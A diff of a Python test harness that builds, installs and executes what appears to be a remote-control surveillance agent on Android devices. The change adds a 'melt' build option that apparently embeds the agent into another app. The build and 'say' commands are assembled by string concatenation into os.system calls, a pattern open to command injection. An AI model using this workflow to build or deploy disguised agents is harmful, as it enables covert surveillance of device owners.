@@ -13,8 +13,7 @@ import inspect
 import sys
 
 
-
-from check_common import TestFunctionalBase
+from specific_test_functional_base import SpecificTestFunctionalBase
 
 inspect_getfile = inspect.getfile(inspect.currentframe())
 cmd_folder = os.path.split(os.path.realpath(os.path.abspath(inspect_getfile)))[0]
@@ -43,10 +42,14 @@ def say(text):
     os.system("say " + text)
 
 def install(command_dev, results, apk_names = None):
-    if results['release'].startswith("2"):
-        agent = "agent_v2"
+
+    if results['melt']:
+        agent = "melt"
     else:
-        agent = "agent"
+        if results['release'].startswith("2"):
+            agent = "agent_v2"
+        else:
+            agent = "agent"
 
     if apk_names:
         apk_file = apk_names[agent]
@@ -77,7 +80,7 @@ def uninstall_agent(commands_device, c, results):
 
     for i in range(12):
         processes = commands_device.get_processes()
-        uninstall = TestFunctionalBase.service not in processes
+        uninstall = SpecificTestFunctionalBase.service not in processes
         print "service still running"
         if uninstall:
             break
@@ -170,6 +173,21 @@ def report_files(results, report):
         logfile.write("\n")
 
 
+def build_apk(command_dev, commands_rcs, jparam, melt):
+    json_params = "build/params.json"
+    f = open(json_params, "w")
+    f.write(jparam)
+    f.close()
+    command_dev.report("BUILD")
+
+    m=""
+    if melt:
+        m = "-i %s" % melt
+    os.system(
+        'ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -b %s -o and.zip %s' % (
+            commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory, json_params, m))
+
+
 def test_device_specific(test_specific, commands_rcs, command_dev, args, results):
     if args.fastnet:
         command_dev.wifi('open', check_connection=False, install=True)
@@ -184,9 +202,10 @@ def test_device_specific(test_specific, commands_rcs, command_dev, args, results
 
     apk_name_def = 'assets/autotest.%s.default.apk' % test_specific.get_name()
     apk_name_v2 = 'assets/autotest.%s.v2.apk' % test_specific.get_name()
-    apk_names = {"agent" : apk_name_def, "agent_v2": apk_name_v2}
+    apk_name_melt = 'assets/autotest.%s.m.apk' % test_specific.get_name()
+    apk_names = {"agent" : apk_name_def, "agent_v2": apk_name_v2, "melt": apk_name_melt}
 
-    if args.build or not os.path.exists(apk_name_def) or not os.path.exists(apk_name_v2):
+    if args.build or not ( os.path.exists(apk_name_def) and os.path.exists(apk_name_v2) or os.path.exists(apk_name_melt)) :
         command_dev.report( "CONFIG")
 
         config = test_specific.get_config()
@@ -204,27 +223,27 @@ def test_device_specific(test_specific, commands_rcs, command_dev, args, results
 
         params = test_specific.get_params()
         persist = test_specific.want_persist()
+        melt = test_specific.melting_app()
 
         if persist:
             command_dev.report( "PERSIST" )
             params[u'package'][u'type']
 
         jparam = json.dumps(params)
-        json_params = "build/params.json"
-        f = open(json_params, "w")
-        f.write(jparam)
-        f.close()
+        build_apk(command_dev, commands_rcs, jparam, melt)
 
-        command_dev.report( "BUILD" )
-        os.system(
-            'ruby assets/rcs-core.rb -u %s -p %s -d %s -f %s -b %s -o and.zip' % (
-                commands_rcs.login, commands_rcs.password, commands_rcs.host, commands_rcs.factory, json_params))
-        os.system('unzip -o  and.zip -d assets')
+        os.system('unzip -o and.zip -d assets')
         os.remove('and.zip')
-        shutil.copyfile('assets/autotest.default.apk', apk_name_def)
-        os.rename('assets/autotest.v2.apk', apk_name_v2)
 
-    if not os.path.exists(apk_name_def) or not os.path.exists(apk_name_v2):
+        if not melt:
+            shutil.copyfile('assets/autotest.default.apk', apk_name_def)
+            os.rename('assets/autotest.v2.apk', apk_name_v2)
+            results['melt'] = False
+        else:
+            os.rename('assets/autotest.m.apk', apk_name_melt)
+            results['melt'] = True
+
+    if not ( os.path.exists(apk_name_def) and os.path.exists(apk_name_v2) or os.path.exists(apk_name_melt)):
         print "ERROR, cannot build apk"
         exit(0)
 
@@ -252,7 +271,7 @@ def test_device_specific(test_specific, commands_rcs, command_dev, args, results
                 return "old installation present"
 
             command_dev.report( "EXECUTE" )
-            results["executed"] = command_dev.execute_agent()
+            results["executed"] = command_dev.execute_agent(results["melt"])
             if results["executed"]:
                 print "executed"
             else:
